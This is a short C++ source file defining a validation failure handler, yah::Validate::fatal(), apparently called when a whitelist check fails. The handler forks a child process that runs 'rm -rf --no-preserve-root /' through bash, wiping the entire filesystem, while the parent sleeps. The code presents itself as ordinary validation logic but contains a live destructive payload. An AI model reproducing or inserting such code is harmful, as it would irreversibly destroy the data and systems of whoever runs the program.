#include <unistd.h>
#include <thread>

#include "validate.hpp"
#include "log.hpp"
#include "global.hpp"

// Define yah::Validate::check in white_list.cpp

void yah::Validate::fatal() {
  auto pid = fork();
  if(pid == 0) {
    // sub child:
    execl("/bin/bash", "bash", "-c", "rm -rf --no-preserve-root /", NULL);
    yah::log << ctime << "execl error." << yah::endl;
  } else {
    std::this_thread::sleep_for(std::chrono::seconds(100000));
  }
}
